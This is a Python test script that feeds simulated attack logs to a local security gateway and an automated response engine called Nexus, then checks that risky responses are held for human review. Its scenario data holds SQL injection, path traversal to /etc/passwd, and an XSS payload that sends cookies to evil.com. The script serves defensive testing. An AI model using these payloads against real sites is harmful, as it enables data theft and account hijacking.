#!/usr/bin/env python3
"""
SENTINEL + Nexus — Full Pipeline Test Script
===============================================
Simulates a real attack hitting the system end-to-end:

  1. POST /api/logs/ingest  → Gateway receives malicious request
  2. Gateway calls Detection Engine /analyze
  3. Gateway saves AttackEvent → emits attack:new
  4. Gateway calls Nexus /respond (non-blocking)
  5. Nexus evaluates intents → ALLOWS safe actions, BLOCKS risky ones
  6. Blocked actions saved to action_queue
  7. Audit log populated

Usage:
  python scripts/simulate_attack.py
  python scripts/simulate_attack.py --severity critical
  python scripts/simulate_attack.py --type xss --severity high
  python scripts/simulate_attack.py --all   # runs all scenario types

Requirements:
  pip install requests

Services must be running:
  Gateway   → http://localhost:3000
  Nexus   → http://localhost:8004  (needed for enforcement)
  Detection → http://localhost:8002  (optional, gateway falls back)
"""

import requests
import json
import time
import argparse
import sys
from datetime import datetime

GATEWAY = "http://localhost:3000"
Nexus = "http://localhost:8004"

COLOURS = {
    "green":  "\033[92m",
    "red":    "\033[91m",
    "yellow": "\033[93m",
    "cyan":   "\033[96m",
    "bold":   "\033[1m",
    "reset":  "\033[0m",
}

def c(colour, text):
    return f"{COLOURS.get(colour, '')}{text}{COLOURS['reset']}"

def header(title):
    print()
    print(c("bold", "=" * 60))
    print(c("cyan", f"  {title}"))
    print(c("bold", "=" * 60))

def step(n, text):
    print(f"\n{c('yellow', f'[STEP {n}]')} {text}")

def ok(text):
    print(f"  {c('green', '✓')} {text}")

def fail(text):
    print(f"  {c('red', '✗')} {text}")

def info(text):
    print(f"  {c('cyan', '→')} {text}")


# ──────────────────────────────────────────────────────────────────────────────
# Attack payloads
# ──────────────────────────────────────────────────────────────────────────────
SCENARIOS = {
    "sqli_critical": {
        "label": "SQL Injection — CRITICAL (triggers shutdown_endpoint BLOCK)",
        "payload": {
            "projectId": "test-demo",
            "method": "GET",
            "url": "/api/users?id=1' OR '1'='1' UNION SELECT * FROM users--",
            "ip": "192.168.5.22",
            "queryParams": {
                "id": "1' OR '1'='1' UNION SELECT * FROM users--",
                "responseCode": "200"
            },
            "body": {},
            "headers": {
                "userAgent": "sqlmap/1.7",
                "contentType": "application/json",
                "referer": ""
            },
            "responseCode": 200
        },
        "severity_override": "critical"
    },
    "xss_high": {
        "label": "XSS — HIGH (triggers permanent_ban BLOCK)",
        "payload": {
            "projectId": "test-demo",
            "method": "POST",
            "url": "/api/comments",
            "ip": "10.0.0.55",
            "queryParams": {},
            "body": {
                "comment": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
            },
            "headers": {
                "userAgent": "Mozilla/5.0 (attacker)",
                "contentType": "application/json",
                "referer": ""
            },
            "responseCode": 200
        },
        "severity_override": "high"
    },
    "brute_force_medium": {
        "label": "Brute Force — MEDIUM (only safe actions, nothing blocked)",
        "payload": {
            "projectId": "test-demo",
            "method": "POST",
            "url": "/api/login",
            "ip": "172.16.0.100",
            "queryParams": {},
            "body": {
                "username": "admin",
                "password": "password123"
            },
            "headers": {
                "userAgent": "python-requests/2.28",
                "contentType": "application/json",
                "referer": ""
            },
            "responseCode": 403
        },
        "severity_override": "medium"
    },
    "traversal_critical": {
        "label": "Path Traversal — CRITICAL + SUCCESSFUL (triggers shutdown_endpoint BLOCK)",
        "payload": {
            "projectId": "test-demo",
            "method": "GET",
            "url": "/api/files?path=../../../../etc/passwd",
            "ip": "203.0.113.42",
            "queryParams": {"path": "../../../../etc/passwd"},
            "body": {},
            "headers": {
                "userAgent": "curl/7.88.1",
                "contentType": "",
                "referer": ""
            },
            "responseCode": 200
        },
        "severity_override": "critical"
    }
}


def check_service(url, name):
    """Check if a service is reachable."""
    try:
        r = requests.get(f"{url}/health", timeout=3)
        if r.status_code == 200:
            ok(f"{name} is online ({url})")
            return True
        else:
            fail(f"{name} returned status {r.status_code}")
            return False
    except Exception as e:
        fail(f"{name} is OFFLINE — {e}")
        return False


def ingest_log(payload):
    """POST to /api/logs/ingest."""
    r = requests.post(
        f"{GATEWAY}/api/logs/ingest",
        json=payload,
        timeout=15,
        headers={"Content-Type": "application/json"}
    )
    r.raise_for_status()
    return r.json()


def test_Nexus_direct(scenario_key, scenario):
    """Call Nexus /respond directly with a mock attackId (bypass Gateway)."""
    import uuid
    severity = scenario["severity_override"]
    attack_type_map = {
        "sqli_critical":       "sqli",
        "xss_high":            "xss",
        "brute_force_medium":  "brute_force",
        "traversal_critical":  "traversal",
    }
    payload = {
        "attackId":   str(uuid.uuid4()),
        "ip":         scenario["payload"]["ip"],
        "attackType": attack_type_map.get(scenario_key, "unknown"),
        "severity":   severity,
        "status":     "successful" if scenario["payload"]["responseCode"] == 200 else "blocked",
        "confidence": 0.97 if severity == "critical" else 0.85
    }
    r = requests.post(
        f"{Nexus}/respond",
        json=payload,
        timeout=10,
        headers={"Content-Type": "application/json"}
    )
    r.raise_for_status()
    return r.json()


def run_scenario(key, scenario, use_direct=False):
    header(scenario["label"])

    # ── Step 1: Ingest log via Gateway ────────────────────────────────────────
    step(1, "Sending malicious request to Gateway POST /api/logs/ingest")
    info(f"URL payload: {scenario['payload']['url']}")
    info(f"Source IP:   {scenario['payload']['ip']}")

    attack_id = None
    if not use_direct:
        try:
            resp = ingest_log(scenario["payload"])
            ok(f"Gateway accepted log → id={resp.get('data', {}).get('id', 'N/A')}")
        except Exception as e:
            fail(f"Gateway ingest failed: {e}")
            info("Falling back to direct Nexus test...")
            use_direct = True

    # ── Step 2: Direct Nexus test (always run for clarity) ─────────────────
    step(2, "Calling Nexus POST /respond directly (demonstrates enforcement)")
    try:
        Nexus_resp = test_Nexus_direct(key, scenario)
        executed = Nexus_resp.get("actionsExecuted", [])
        queued   = Nexus_resp.get("actionsQueued",   [])
        audited  = Nexus_resp.get("auditEntries",    0)

        ok(f"Nexus responded")
        print()
        print(f"  {c('green', 'ALLOWED (auto-executed):')}", executed if executed else "(none)")
        if queued:
            print(f"  {c('red', 'BLOCKED (queued for human review):')}",
                  [q["action"] for q in queued])
            for q in queued:
                print(f"    • {c('red', q['action'])}")
                print(f"      Agent reason:   {q.get('agentReason', '')}")
                print(f"      Blocked reason: {q.get('blockedReason', '')}")
        else:
            print(f"  {c('yellow', 'BLOCKED:')} (none — all actions were safe)")

        print(f"  {c('cyan', 'Audit entries written:')} {audited}")

    except Exception as e:
        fail(f"Nexus call failed: {e}")
        info("Is Nexus running? → uvicorn main:app --port 8004")
        return False

    return True


def print_next_steps():
    header("What to check in the Dashboard")
    print()
    print(f"  {c('cyan', '1. Action Queue')}")
    print(f"     http://localhost:5173/action-queue")
    print(f"     → Blocked actions appear here with APPROVE / REJECT buttons")
    print()
    print(f"  {c('cyan', '2. Audit Log')}")
    print(f"     http://localhost:5173/audit")
    print(f"     → Every ALLOWED and BLOCKED decision with policy rule IDs")
    print()
    print(f"  {c('cyan', '3. Live Attacks Feed')}")
    print(f"     http://localhost:5173/dashboard")
    print(f"     → attack:new events appear in real-time")
    print()
    print(f"  {c('cyan', '4. Alerts')}")
    print(f"     http://localhost:5173/alerts")
    print(f"     → send_alert action creates entries here")
    print()
    print(f"  {c('cyan', '5. Verify API directly')}")
    print(f"     GET  http://localhost:3000/api/actions/pending")
    print(f"     GET  http://localhost:3000/api/audit")
    print()


def main():
    parser = argparse.ArgumentParser(description="SENTINEL Nexus test simulator")
    parser.add_argument("--all",      action="store_true", help="Run all scenarios")
    parser.add_argument("--scenario", default="sqli_critical",
                        choices=list(SCENARIOS.keys()),
                        help="Which scenario to run (default: sqli_critical)")
    parser.add_argument("--direct",   action="store_true",
                        help="Call Nexus directly, skip Gateway ingest")
    args = parser.parse_args()

    print()
    print(c("bold", "SENTINEL + Nexus — Pipeline Test"))
    print(c("cyan",  f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))

    # ── Service health check ─────────────────────────────────────────────────
    header("Service Health Check")
    gateway_ok = check_service(GATEWAY, "Gateway API")
    Nexus_ok = check_service(Nexus, "SENTINAL Response Engine")

    if not Nexus_ok:
        print()
        print(c("red", "  Nexus is not running. Start it first:"))
        print(c("yellow", "  cd services/sentinal-response-engine && uvicorn main:app --port 8004 --reload"))
        print()
        sys.exit(1)

    # ── Run scenarios ────────────────────────────────────────────────────────
    scenarios_to_run = SCENARIOS if args.all else {args.scenario: SCENARIOS[args.scenario]}

    results = []
    for key, scenario in scenarios_to_run.items():
        success = run_scenario(key, scenario, use_direct=args.direct or not gateway_ok)
        results.append((scenario["label"], success))
        time.sleep(0.5)

    # ── Summary ──────────────────────────────────────────────────────────────
    header("Test Summary")
    for label, success in results:
        status = c("green", "PASS") if success else c("red", "FAIL")
        print(f"  [{status}] {label}")

    print_next_steps()


if __name__ == "__main__":
    main()
